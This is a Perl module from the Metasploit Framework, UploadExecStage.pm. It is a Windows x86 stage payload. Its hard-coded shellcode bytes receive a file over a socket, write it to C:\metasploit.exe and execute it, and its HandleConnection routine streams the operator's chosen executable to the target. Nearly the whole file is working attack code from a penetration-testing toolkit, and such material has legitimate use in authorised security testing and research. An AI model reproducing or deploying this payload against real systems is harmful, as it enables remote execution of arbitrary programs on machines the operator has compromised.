###############
##
#
#    Name: UploadExecStage.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Uploads an executable file and then executes it.
#
##
###############

package Msf::PayloadComponent::Windows::ia32::UploadExecStage;

use strict;
use base 'Msf::PayloadComponent::Windows::StagePayload';

my $info = 
{
	'UserOpts'     =>
		{
			'PEXEC'  => [ 1, 'PATH', 'Full path to file to upload and execute' ],
		},
	'StagePayload' =>
		{
			Offsets  => 
				{ 
					EXITFUNC => [ 258, 'V' ] 
				},
			Payload  =>   
				"\xff\x75\x00\x68\xa5\x17\x00\x7c\xff\x55\x04\x89\x45\x64\xff\x75".
				"\x00\x68\x1f\x79\x0a\xe8\xff\x55\x04\x89\x45\x68\xff\x75\x00\x68".
				"\xfb\x97\xfd\x0f\xff\x55\x04\x89\x45\x6c\x8d\x45\x78\x6a\x00\x6a".
				"\x04\x50\x57\xff\x55\x18\x8b\x45\x78\xe8\x12\x00\x00\x00\x43\x3a".
				"\x5c\x6d\x65\x74\x61\x73\x70\x6c\x6f\x69\x74\x2e\x65\x78\x65\x00".
				"\x59\x89\x4d\x70\x6a\x00\x6a\x06\x6a\x04\x6a\x00\x6a\x07\x68\x00".
				"\x00\x00\xe0\x51\xff\x55\x64\x89\xc3\x81\xec\x58\xff\xff\xff\x89".
				"\x65\x74\x8b\x45\x74\x6a\x00\x6a\x20\x50\x57\xff\x55\x18\x8b\x4d".
				"\x78\x29\xc1\x89\x4d\x78\x54\x89\xe1\x6a\x00\x51\x50\xff\x75\x74".
				"\x53\xff\x55\x68\x59\x8b\x45\x78\x85\xc0\x75\xd6\x53\xff\x55\x6c".
				"\x87\xfa\x31\xc0\x8d\x7c\x24\xac\x6a\x15\x59\xf3\xab\x87\xfa\x83".
				"\xec\x54\xc6\x44\x24\x10\x44\x66\xc7\x44\x24\x3c\x01\x01\x89\x7c".
				"\x24\x48\x89\x7c\x24\x4c\x89\x7c\x24\x50\x8d\x44\x24\x10\x54\x50".
				"\x51\x51\x51\x41\x51\x49\x51\x51\xff\x75\x70\x51\xff\x75\x00\x68".
				"\x72\xfe\xb3\x16\xff\x55\x04\xff\xd0\x89\xe6\xff\x75\x00\x68\xad".
				"\xd9\x05\xce\xff\x55\x04\x89\xc3\x6a\xff\xff\x36\xff\xd3\xff\x75".
				"\x00\x68\x7e\xd8\xe2\x73\xff\x55\x04\x31\xdb\x53\xff\xd0"
		}
};

sub new
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash);

	return $self;
}

#
# Transfers the executable to the remote machine
#
sub HandleConnection 
{
	my $self = shift;
	my $blocking;
	my $sock;
	$self->SUPER::HandleConnection;

	$sock = $self->PipeRemoteOut;
	$blocking = $sock->blocking;

	if (!open(INFILE, '<' . $self->GetVar('PEXEC'))) 
	{
		$self->PrintLine('[*] Could not open path to upload/exec.');
		$self->KillChild;
		return;
	}

	local $/;
	my $upload = <INFILE>;
	close(INFILE);

	$sock->blocking(1);

	$self->PrintLine('[*] Sleeping before sending file.');
	sleep(2);

	$self->PrintLine('[*] Uploading file (' . length($upload) . '), Please wait...');
	eval { $sock->send(pack('V', length($upload))); };
	eval { $sock->send($upload); };
	$self->PrintLine('[*] Executing uploaded file...');

	$sock->blocking($blocking);
}

1;
